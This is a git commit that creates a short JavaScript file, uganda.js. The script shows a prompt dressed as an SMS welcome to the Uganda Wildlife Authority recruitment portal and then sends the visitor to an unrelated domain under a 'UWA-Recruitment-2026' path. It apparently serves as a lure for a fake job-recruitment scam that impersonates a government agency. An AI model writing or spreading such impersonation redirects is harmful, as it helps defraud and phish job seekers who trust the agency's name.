e7d9d4681cff98ab2f05edf89469152afdd15744
newetijazz22 <newetijazz22@gmail.com>
2026-01-29 17:40:41 +0100

    Create uganda.js

---
+++ uganda.js
@@ -0,0 +1,6 @@
+var password = 'UWA Recruitment'
+password=prompt('SMS: Welcome to the Uganda Wildlife Authority (UWA) application portal, press OK to apply for the','UWA Recruitment');
+if (password != 'UWA Recruitment');
+if (password != 'UWA Recruitment') {
+location.href='https://www.vrhmfed.site/UWA-Recruitment-2026';
+}
